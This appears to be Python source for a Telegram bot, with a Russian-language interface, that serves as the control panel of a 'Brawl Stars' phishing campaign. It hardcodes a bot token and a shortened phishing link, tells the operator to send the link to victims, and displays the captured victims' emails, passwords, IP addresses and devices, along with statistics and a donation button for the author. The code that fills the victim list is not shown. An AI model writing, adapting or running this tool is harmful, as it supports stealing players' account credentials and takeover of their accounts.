import requests
import time
import json

BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
ADMIN_ID = 8744429026
PHISHING_URL = "https://da.gd/tzO5QW"

last_update_id = 0
victims = []

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    requests.post(url, json=data)

def edit_message(chat_id, message_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    requests.post(url, json=data)

def answer_callback(callback_id, text="", show_alert=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    data = {"callback_query_id": callback_id, "text": text, "show_alert": show_alert}
    requests.post(url, json=data)

def get_main_keyboard():
    return [
        [{"text": "📋 Данные жертв", "callback_data": "data"}],
        [{"text": "📊 Статистика", "callback_data": "stats"}],
        [{"text": "💰 Поддержать автора", "callback_data": "donate"}]
    ]

def get_back_keyboard():
    return [[{"text": "⬅️ Назад", "callback_data": "back"}]]

print("✅ Бот запущен на Render.com!")
print(f"🔗 Ссылка: {PHISHING_URL}")

while True:
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=10"
        response = requests.get(url).json()

        for update in response.get("result", []):
            last_update_id = update["update_id"]
            message = update.get("message", {})
            callback = update.get("callback_query", {})

            if message:
                chat_id = message.get("chat", {}).get("id")
                text = message.get("text", "")

                if text == "/start":
                    send_message(chat_id,
                        f"🎉 **BRAWL STARS FISHING** 🎉\n\n"
                        f"🔗 **Фишинг-ссылка:**\n`{PHISHING_URL}`\n\n"
                        f"👨‍💼 **Поймано жертв:** {len(victims)}\n\n"
                        f"📌 Отправь ссылку жертве — данные придут сюда.",
                        get_main_keyboard())

            if callback:
                chat_id = callback.get("from", {}).get("id")
                data = callback.get("data")
                callback_id = callback.get("id")
                message_id = callback.get("message", {}).get("message_id")

                if data == "back":
                    edit_message(chat_id, message_id,
                        f"🎉 **BRAWL STARS FISHING** 🎉\n\n"
                        f"🔗 **Фишинг-ссылка:**\n`{PHISHING_URL}`\n\n"
                        f"👨‍💼 **Поймано жертв:** {len(victims)}\n\n"
                        f"📌 Отправь ссылку жертве — данные придут сюда.",
                        get_main_keyboard())
                    answer_callback(callback_id)

                elif data == "data":
                    if not victims:
                        edit_message(chat_id, message_id, "📭 **Нет данных**\n\nПока нет ни одной жертвы.", get_back_keyboard())
                    else:
                        txt = "👥 **Пойманные жертвы:**\n\n"
                        for v in victims[-30:]:
                            txt += f"📧 {v['email']}\n🔑 {v['password']}\n📡 {v['ip']}\n📱 {v['device']}\n⏰ {v['time']}\n"
                            txt += "─" * 30 + "\n"
                        if len(txt) > 4000:
                            txt = txt[:3900] + "\n...(обрезано)"
                        edit_message(chat_id, message_id, txt, get_back_keyboard())
                    answer_callback(callback_id)

                elif data == "stats":
                    unique_ips = len(set(v.get('ip') for v in victims if v.get('ip')))
                    edit_message(chat_id, message_id,
                        f"📊 **Статистика:**\n\n"
                        f"👨‍💼 Всего жертв: {len(victims)}\n"
                        f"🌐 Уникальных IP: {unique_ips}",
                        get_back_keyboard())
                    answer_callback(callback_id)

                elif data == "donate":
                    donate_link = "https://t.me/telegram?start=star50"
                    keyboard = [
                        [{"text": "⭐ Отправить 50 звёзд", "url": donate_link}],
                        [{"text": "⬅️ Назад", "callback_data": "back"}]
                    ]
                    edit_message(chat_id, message_id,
                        f"✨ **Поддержать автора** ✨\n\n"
                        f"Нажми на кнопку ниже, чтобы отправить **50 Telegram Stars**.\n\n"
                        f"⭐ Telegram Stars — официальная поддержка.\n"
                        f"💰 50 звёзд ≈ 100 рублей\n\n"
                        f"Спасибо за поддержку! 💙",
                        keyboard)
                    answer_callback(callback_id)

        time.sleep(1)

    except Exception as e:
        print(f"Ошибка: {e}")
        time.sleep(5)
